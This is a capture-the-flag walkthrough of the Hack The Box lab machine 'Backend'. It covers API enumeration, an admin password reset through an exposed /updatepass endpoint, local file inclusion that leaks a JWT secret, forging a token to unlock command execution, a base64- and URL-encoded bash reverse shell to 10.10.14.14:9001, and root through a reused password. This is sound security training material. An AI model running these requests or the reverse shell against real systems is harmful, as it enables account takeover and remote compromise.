# Backend
```
Difficulty: Medium
Operating System: Linux
Hints: True
```

#### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | (Local) | Nmap Scan & API Enumeration | Found a web server on port 80 running an API with `uvicorn`. Manually and with `wfuzz`, discovered endpoints like `/api/v1/user`, `/api/v1/admin`, and the `/docs` page. |
| 2 | (Web) | API User Creation & Credential Theft | Used `wfuzz` with the `-X POST` option to discover the `/signup` and `/login` endpoints. Created a new user and logged in, receiving a JWT token. Also used enumeration on `/api/v1/user/` to find a user with the email `admin@htb.local` and a GUID. |
| 3 | (Web) | Insecure API Call & JWT Token Forgery | Used the newly created user's JWT token to access the `/docs` endpoint, which revealed a Swagger UI. Discovered a `/updatepass` endpoint and used it to change the password for the `admin@htb.local` user using their known GUID. |
| 4 | (Web) | LFI through API & JWT Secret Disclosure | Used the admin JWT token to access the `/api/v1/admin/file` endpoint, which was vulnerable to Local File Inclusion. Enumerated the file system to find the application's source code, leading to the discovery of the **JWT signing secret**. |
| 5 | (Web) | JWT Forgery & Command Execution | Used the discovered JWT secret to forge a new token with a `"debug": true` payload. This enabled command execution via the `/api/v1/admin/exec/{command}` endpoint. A reverse shell payload was crafted, Base64-encoded, and URL-encoded to bypass restrictions. |
| 6 | htb | Reverse Shell | Executed the reverse shell payload through the API, gaining an interactive shell as the `htb` user. |
| 7 | htb -> root | Password Reuse | Discovered an `auth.log` file in the user's home directory with a login failure for the string `Tr0ub4dor&3`. Attempted to use this string as a password with `su -`, which successfully granted root access. |

## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```shell
Nmap scan report for 10.10.11.161
Host is up (0.037s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    uvicorn
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     content-type: text/plain; charset=utf-8
|     Connection: close
|     Invalid HTTP request received.
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     date: Tue, 26 Jul 2022 17:17:51 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"detail":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 200 OK
|     date: Tue, 26 Jul 2022 17:17:39 GMT
|     server: uvicorn
|     content-length: 29
|     content-type: application/json
|     Connection: close
|     {"msg":"UHC API Version 1.0"}
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     date: Tue, 26 Jul 2022 17:17:45 GMT
|     server: uvicorn
|     content-length: 31
|     content-type: application/json
|     Connection: close
|_    {"detail":"Method Not Allowed"}
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: uvicorn
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=7/26%Time=62DFE6ED%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,AD,"HTTP/1\.1\x20200\x20OK\r\ndate:\x20Tue,\x2026\x20Jul\x202022
SF:\x2017:17:39\x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\x2029\r\nc
SF:ontent-type:\x20application/json\r\nConnection:\x20close\r\n\r\n{\"msg\
SF:":\"UHC\x20API\x20Version\x201\.0\"}")%r(HTTPOptions,BF,"HTTP/1\.1\x204
SF:05\x20Method\x20Not\x20Allowed\r\ndate:\x20Tue,\x2026\x20Jul\x202022\x2
SF:017:17:45\x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\x2031\r\ncont
SF:ent-type:\x20application/json\r\nConnection:\x20close\r\n\r\n{\"detail\
SF:":\"Method\x20Not\x20Allowed\"}")%r(RTSPRequest,76,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(F
SF:ourOhFourRequest,AD,"HTTP/1\.1\x20404\x20Not\x20Found\r\ndate:\x20Tue,\
SF:x2026\x20Jul\x202022\x2017:17:51\x20GMT\r\nserver:\x20uvicorn\r\nconten
SF:t-length:\x2022\r\ncontent-type:\x20application/json\r\nConnection:\x20
SF:close\r\n\r\n{\"detail\":\"Not\x20Found\"}")%r(GenericLines,76,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20rece
SF:ived\.")%r(DNSVersionBindReqTCP,76,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clos
SF:e\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(DNSStatusRequestT
SF:CP,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20text/plai
SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20HTTP\x20r
SF:equest\x20received\.")%r(SSLSessionReq,76,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(TerminalSe
SF:rverCookie,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20H
SF:TTP\x20request\x20received\.")%r(TLSSessionReq,76,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConn
SF:ection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As we can see we have only port 80 and 22 in opened status.  
Port 80 is exposing an API service through `uvicorn`.  
Digging into port 80 we can easily find through manual/directory enumeration, the following endpoint:  
```
/docs                 (Status: 401) [Size: 30]
/api                  (Status: 200) [Size: 20]
```
after we found these two main paths we can see that docs is giving a 401, thus it requires some authentication, while api endpoint is open.  
```json
{"detail":"Not authenticated"}
```
Now, using `wfuzz` we can run enumeration against `api` endpoint and we discover the following:  
```
Target: http://10.10.11.161/api/FUZZ
Total requests: 1273833
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
02243:  C=200      0 L	       1 W	     30 Ch	  "v1"

Total time: 0
Processed Requests: 5484
Filtered Requests: 5483
Requests/sec.: 0
```
Now, let's recursively dig deeper. If we open `http://10.10.11.161/api/v1` the API gives us a big hint, allowing us to enumerate two additional endpoints `/user` and `/admin`.
If we recursively look into these endpoints, we can see the following for `/user`
```
Target: http://10.10.11.161/api/v1/user/FUZZ
Total requests: 119600
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00213:  C=200      0 L	       1 W	    141 Ch	  "1"
00933:  C=200      0 L	       1 W	    141 Ch	  "01"
05319:  C=200      0 L	       1 W	    141 Ch	  "001"
10848:  C=200      0 L	       1 W	    141 Ch	  "0001"
64424:  C=200      0 L	       1 W	    141 Ch	  "000001"

Total time: 0
Processed Requests: 119600
Filtered Requests: 119595
Requests/sec.: 0
```
That can allow us to enumerate an `admin@htb.local` user:  
```json
{"guid":"36c2e94a-4271-4259-93bf-c96ad5948284","email":"admin@htb.local","date":null,"time_created":1649533388111,"is_superuser":true,"id":1}
```
and we can have the below for `/admin`  
```
Target: http://10.10.11.161/api/v1/admin/FUZZ
Total requests: 119600
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00547:  C=405      0 L	       3 W	     31 Ch	  "file"

Total time: 0
Processed Requests: 119600
Filtered Requests: 119599
Requests/sec.: 0
```
As we can see there is a `/file` endpoint that requires authentication.  
Now, as a good practice to keep in mind, we can enumerate the APIs using post requests.  
Since we are seeing users into the system, we can expect that there is a way to register a new user into the API system, if so, this endpoint will require a POST method, hence we can use `wfuzz` with  `-X POST` option to enumerate API endpoint that require an HTTP POST request.
```
Target: http://10.10.11.161/api/v1/user/FUZZ
Total requests: 1273833
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00053:  C=422      0 L	       3 W	    172 Ch	  "login"
00217:  C=422      0 L	       2 W	     81 Ch	  "signup"

Total time: 0
Processed Requests: 7687
Filtered Requests: 7685
Requests/sec.: 0
```
Now, as we can see we discovered two new endpoints: `/login` and `/signup` which we can supposed they are used to create a new user and login an existing user. 

## Foothold
Since we do not have any user credentials to access the API we can try to create a user and gain an initial foothold into the API.  
To do so, we can perform requests against the `http://10.10.11.161/api/v1/user/signup` endpoint and debug response errors in order to create a valid payload for user creation, at the end, we can come up with the following:   
```http
POST /api/v1/user/signup HTTP/1.1
Host: 10.10.11.161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Type: application/json
Content-Length: 77

{
	"username": "b0d",
	"email":  "b0d@haha.com",
	"password":"Password"
}
```
and as a response we get:  
```http
HTTP/1.1 201 Created
date: Wed, 27 Jul 2022 16:18:50 GMT
server: uvicorn
content-length: 2
content-type: application/json
Connection: close

{}
```
So, now that we defined a new user, we can try to login this user against the API service.  
Again, to do this, we need to debug the API error messages, at the end we can come up with the following request:
```http
POST /api/v1/user/login HTTP/1.1
Host: 10.10.11.161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Content-type: application/x-www-form-urlencoded
Content-Length: 39

username=b0d@haha.com&password=Password
```
and as a response we get a JWT token:  
```http
HTTP/1.1 200 OK
date: Wed, 27 Jul 2022 16:33:36 GMT
server: uvicorn
content-length: 301
content-type: application/json
Connection: close

{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU5NjMwODE2LCJpYXQiOjE2NTg5Mzk2MTYsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiOGE1ODY4MTgtN2MwMS00YzhiLTg3ZmItZTE3ZTRlYTU0NTc3In0.GwIaZvCct8X4Wir15fG2af6oepn-2tf7Dgm9sFHi8MM","token_type":"bearer"}
```
Once we have the token, we can try to login into the initially discovered endpoint `/docs` and see if we have anything interesting here.  
To authenticate against this endpoint we need to add the Authorisation header as well as the JWT token.
```http
GET /docs HTTP/1.1
Host: 10.10.11.161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU5NjMxMTUyLCJpYXQiOjE2NTg5Mzk5NTIsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiOGE1ODY4MTgtN2MwMS00YzhiLTg3ZmItZTE3ZTRlYTU0NTc3In0.Hjw6uONnhht4gMq3-xb6s_WAbKqCdSdF8LA7Tb-b9rg
```
then we'll need to add the same token to each of the following HTTP requests:  
```http
GET /openapi.json HTTP/1.1
Host: 10.10.11.161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.161/docs
Connection: close
Sec-GPC: 1
Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU5NjMxMTUyLCJpYXQiOjE2NTg5Mzk5NTIsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiOGE1ODY4MTgtN2MwMS00YzhiLTg3ZmItZTE3ZTRlYTU0NTc3In0.Hjw6uONnhht4gMq3-xb6s_WAbKqCdSdF8LA7Tb-b9rg
```

## User
Once we have an initial foothold into the API we can see that the `/docs` endpoint is serving a swaggerUI service, here we can see interesting APIs that we can use to leverage an attack.  
For example, we can see an `/updatepass` endpoint which is requesting not only the new basswood but also the guid.  
If we send to this endpoint a new password and the guid of admin that we discovered  earlier, we might be able to change the password of the admin account:  
```http
POST /api/v1/user/updatepass HTTP/1.1
Host: 10.10.11.161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.161/docs
Content-Type: application/json
Origin: http://10.10.11.161
Content-Length: 79
Connection: close
Sec-GPC: 1

{
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
  "password": "Password1"
}
```
As we can see as response we get:  
```http
HTTP/1.1 201 Created
date: Wed, 27 Jul 2022 17:04:03 GMT
server: uvicorn
content-length: 241
content-type: application/json
Connection: close

{"date":null,"id":1,"is_superuser":true,"hashed_password":"$2b$12$iABrm/kqQNQ0XAsAv1S1r.8qx2NFrJ2QVYTPRMtk3dyal5FvIACPy","guid":"36c2e94a-4271-4259-93bf-c96ad5948284","email":"admin@htb.local","time_created":1649533388111,"last_update":null}
```
So, we can assume that we successfully changed the password for the admin account.  
Now that the password is changed, we can try to get a JWT token for the admin user and run a command using the `/exec` endpoint.  
```http
GET /api/v1/admin/exec/whoami HTTP/1.1
Host: 10.10.11.161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.161/docs
Connection: close
Sec-GPC: 1
Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU5NjMxMTUyLCJpYXQiOjE2NTg5Mzk5NTIsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiOGE1ODY4MTgtN2MwMS00YzhiLTg3ZmItZTE3ZTRlYTU0NTc3In0.Hjw6uONnhht4gMq3-xb6s_WAbKqCdSdF8LA7Tb-b9rg
Content-Length: 2
```
As we can see as a response we get:  
```http
HTTP/1.1 400 Bad Request
date: Wed, 27 Jul 2022 17:07:56 GMT
server: uvicorn
content-length: 39
content-type: application/json
Connection: close

{"detail":"Debug key missing from JWT"}
```
So now, we can assume that to make this work we'll need to forge a new JWT token containing the debug key.  
To do this, we'll need to sign a new JWT token. As we know, to sign a new JWT token we'll need the secret.  
To try to obtain the seecret, we can use the `/file` endpoint.  
First of all we can get some information from proc.  
We can check for `/proc/self/cmdline`:
```http
POST /api/v1/admin/file HTTP/1.1
Host: 10.10.11.161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.161/docs
Content-Type: application/json
Origin: http://10.10.11.161
Content-Length: 34
Connection: close
Sec-GPC: 1
Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU5NjMzMjE5LCJpYXQiOjE2NTg5NDIwMTksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.6pBW4BPGXUva9_et2wRTmi69Iy9h7Oxs4vssoNTXh2s

{
  "file": "/proc/self/cmdline"
}
```
And as a response we get:  
```http
HTTP/1.1 200 OK
date: Wed, 27 Jul 2022 17:15:15 GMT
server: uvicorn
content-length: 175
content-type: application/json
Connection: close

{"file":"/home/htb/uhc/.venv/bin/python3\u0000-c\u0000from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7)\u0000--multiprocessing-fork\u0000"}
```
To try to enumerate more about directories where this app is running, we can use `/proc/self/environ`:
```http
POST /api/v1/admin/file HTTP/1.1
Host: 10.10.11.161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.161/docs
Content-Type: application/json
Origin: http://10.10.11.161
Content-Length: 34
Connection: close
Sec-GPC: 1
Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU5NjMzMjE5LCJpYXQiOjE2NTg5NDIwMTksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.6pBW4BPGXUva9_et2wRTmi69Iy9h7Oxs4vssoNTXh2s

{
  "file": "/proc/self/environ"
}
```
And we can see:  
```http
HTTP/1.1 200 OK
date: Wed, 27 Jul 2022 17:14:01 GMT
server: uvicorn
content-length: 420
content-type: application/json
Connection: close

{"file":"APP_MODULE=app.main:app\u0000PWD=/home/htb/uhc\u0000LOGNAME=htb\u0000PORT=80\u0000HOME=/home/htb\u0000LANG=C.UTF-8\u0000VIRTUAL_ENV=/home/htb/uhc/.venv\u0000INVOCATION_ID=2ed503a8b75f4a35abcb85deb7853626\u0000HOST=0.0.0.0\u0000USER=htb\u0000SHLVL=0\u0000PS1=(.venv) \u0000JOURNAL_STREAM=9:17334\u0000PATH=/home/htb/uhc/.venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000OLDPWD=/\u0000"}
```
As we can see the app is running in `/home/htb/uhc/app` and the main file id `main.py`.  
Since we have an LFI, we can look at the source and see if the JWT secret is configured there:  
```http
POST /api/v1/admin/file HTTP/1.1
Host: 10.10.11.161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.161/docs
Content-Type: application/json
Origin: http://10.10.11.161
Content-Length: 41
Connection: close
Sec-GPC: 1
Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU5NjMzMjE5LCJpYXQiOjE2NTg5NDIwMTksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.6pBW4BPGXUva9_et2wRTmi69Iy9h7Oxs4vssoNTXh2s

{
  "file": "/home/htb/uhc/app/main.py"
}
```
and after some mods we can see as a response the file:  
```python
"file":"import asyncio

from fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends
from fastapi_contrib.common.responses import UJSONResponse
from fastapi import FastAPI, Depends, HTTPException, status
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from fastapi.openapi.docs import get_swagger_ui_html
from fastapi.openapi.utils import get_openapi



from typing import Optional, Any
from pathlib import Path
from sqlalchemy.orm import Session



from app.schemas.user import User
from app.api.v1.api import api_router
from app.core.config import settings

from app import deps
from app import crud


app = FastAPI(title="UHC API Quals", openapi_url=None, docs_url=None, redoc_url=None)
root_router = APIRouter(default_response_class=UJSONResponse)


@app.get("/", status_code=200)
def root():
    """
    Root GET
    """
    return {"msg": "UHC API Version 1.0"}


@app.get("/api", status_code=200)
def list_versions():
    """
    Versions
    """
    return {"endpoints":["v1"]}


@app.get("/api/v1", status_code=200)
def list_endpoints_v1():
    """
    Version 1 Endpoints
    """
    return {"endpoints":["user", "admin"]}


@app.get("/docs")
async def get_documentation(
    current_user: User = Depends(deps.parse_token)
    ):
    return get_swagger_ui_html(openapi_url="/openapi.json", title="docs")

@app.get("/openapi.json")
async def openapi(
    current_user: User = Depends(deps.parse_token)
):
    return get_openapi(title = "FastAPI", version="0.1.0", routes=app.routes)

app.include_router(api_router, prefix=settings.API_V1_STR)
app.include_router(root_router)

def start():
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=8001, log_level="debug")

if __name__ == "__main__":
    # Use this for debugging purposes only
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=8001, log_level="debug")
```
As we can see in the initial declararion we can see that this file is importing configurations from:  
```python
from app.core.config import settings
```
So we can try to download this file as well and see if it contains the JWT token:  
```http
POST /api/v1/admin/file HTTP/1.1
Host: 10.10.11.161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.161/docs
Content-Type: application/json
Origin: http://10.10.11.161
Content-Length: 48
Connection: close
Sec-GPC: 1
Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU5NjMzMjE5LCJpYXQiOjE2NTg5NDIwMTksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.6pBW4BPGXUva9_et2wRTmi69Iy9h7Oxs4vssoNTXh2s

{
  "file": "/home/htb/uhc/app/core/config.py"
}
```
After some edits, we can see the source:  
```python
from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator
from typing import List, Optional, Union

from enum import Enum


class Settings(BaseSettings):
    API_V1_STR: str = "/api/v1"
    JWT_SECRET: str = "SuperSecretSigningKey-HTB"
    ALGORITHM: str = "HS256"

    # 60 minutes * 24 hours * 8 days = 8 days
    ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8

    # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins
    # e.g: '["http://localhost", "http://localhost:4200", "http://localhost:3000", \\
    # "http://localhost:8080", "http://local.dockertoolbox.tiangolo.com"]'
    BACKEND_CORS_ORIGINS: List[AnyHttpUrl] = []

    @validator("BACKEND_CORS_ORIGINS", pre=True)
    def assemble_cors_origins(cls, v: Union[str, List[str]]) -> Union[List[str], str]:
        if isinstance(v, str) and not v.startswith("["):
            return [i.strip() for i in v.split(",")]
        elif isinstance(v, (list, str)):
            return v
        raise ValueError(v)

    SQLALCHEMY_DATABASE_URI: Optional[str] = "sqlite:///uhc.db"
    FIRST_SUPERUSER: EmailStr = "root@ippsec.rocks"

    class Config:
        case_sensitive = True


settings = Settings()
```
And in the first lines we can notice:  
```python
JWT_SECRET: str = "SuperSecretSigningKey-HTB"
```
Now that we have the JWT secret we can sign a new token with the `"debug": true` flag.  
To do this we can go to [jwt.io debugger](https://jwt.io)and sign a new token using the secret key.  
![](Attachments/Pasted%20image%2020220728172909.png)
With the newly generated token we can try again the command execution:  
```http
GET /api/v1/admin/exec/whoami HTTP/1.1
Host: 10.10.11.161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.161/docs
Connection: close
Sec-GPC: 1
Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU5NjMzMjE5LCJpYXQiOjE2NTg5NDIwMTksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.nD_DAYky7bKJXhL0V50S7suaJxgcoPuyNQ5D0qCLDzI
Content-Length: 2
```
And now, it works:  
```http
HTTP/1.1 200 OK
date: Wed, 27 Jul 2022 17:24:40 GMT
server: uvicorn
content-length: 5
content-type: application/json
Connection: close

"htb"
```
Now we can build our payload to obtain a shell.  
Since we need to input our payload through the url we cannot use slashes, hence, we'll need to encode our payload with `base64`. Also we cannot use `+` sign because in the url language + means space:  
```shell
[root@kali Backend ]$ echo "bash -i >& /dev/tcp/10.10.14.14/9001 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC85MDAxIDA+JjEK
[root@kali Backend ]$ echo "bash  -i >& /dev/tcp/10.10.14.14/9001  0>&1" | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQvOTAwMSAgMD4mMQo=
[root@kali Backend ]$ echo "bash  -i >& /dev/tcp/10.10.14.14/9001  0>&1 " | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQvOTAwMSAgMD4mMSAK
```
Now we can try to execute our payload.  
As discovered, to make this work, we'll need to urlencode all the characters:  
```http
GET /api/v1/admin/exec/%65%63%68%6f%20%27%59%6d%46%7a%61%43%41%67%4c%57%6b%67%50%69%59%67%4c%32%52%6c%64%69%39%30%59%33%41%76%4d%54%41%75%4d%54%41%75%4d%54%51%75%4e%43%38%35%4d%44%41%78%49%43%41%77%50%69%59%78%49%43%41%4b%27%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68 HTTP/1.1
Host: 10.10.11.161
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.161/docs
Connection: close
Sec-GPC: 1
Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU5NjMzMjE5LCJpYXQiOjE2NTg5NDIwMTksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.nD_DAYky7bKJXhL0V50S7suaJxgcoPuyNQ5D0qCLDzI
Content-Length: 2
```
and finally, we get a shell as `htb` user:  
```
root@kali:~/Documents/HTB/Boxes/Backend# nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.161] 38502
bash: cannot set terminal process group (669): Inappropriate ioctl for device
bash: no job control in this shell
htb@Backend:~/uhc$ id
id
uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
```

## Root
Once we are into the system, we can see an `auth.log` file.  
As we open it, we can see the following:  
```shell
htb@Backend:~/uhc$ cat auth.log 
07/26/2022, 15:51:43 - Login Success for admin@htb.local
07/26/2022, 15:55:03 - Login Success for admin@htb.local
07/26/2022, 16:08:23 - Login Success for admin@htb.local
07/26/2022, 16:11:43 - Login Success for admin@htb.local
07/26/2022, 16:16:43 - Login Success for admin@htb.local
07/26/2022, 16:20:03 - Login Success for admin@htb.local
07/26/2022, 16:33:23 - Login Success for admin@htb.local
07/26/2022, 16:41:43 - Login Success for admin@htb.local
07/26/2022, 16:43:23 - Login Success for admin@htb.local
07/26/2022, 16:50:03 - Login Success for admin@htb.local
07/26/2022, 16:58:23 - Login Failure for Tr0ub4dor&3
07/26/2022, 16:59:58 - Login Success for admin@htb.local
07/26/2022, 17:00:03 - Login Success for admin@htb.local
07/26/2022, 17:00:23 - Login Success for admin@htb.local
07/26/2022, 17:01:43 - Login Success for admin@htb.local
07/26/2022, 17:06:43 - Login Success for admin@htb.local
07/26/2022, 17:13:23 - Login Success for admin@htb.local
07/27/2022, 16:21:52 - Login Failure for b0d
07/27/2022, 16:33:15 - Login Failure for bodd
07/27/2022, 16:33:36 - Login Success for b0d@haha.com
07/27/2022, 16:39:12 - Login Success for b0d@haha.com
07/27/2022, 17:03:33 - Login Success for admin@htb.local
07/27/2022, 17:13:39 - Login Success for admin@htb.local
```
As we can see there is a line that shows a string that doesn't really look like a username.  
As we know, it is a common mistake to input the password instead of the username, so if we try to use that string against `su` authentication for root, we gain access and we own the box:  
```shell
htb@Backend:~/uhc$ su - 
Password: 
root@Backend:~#
```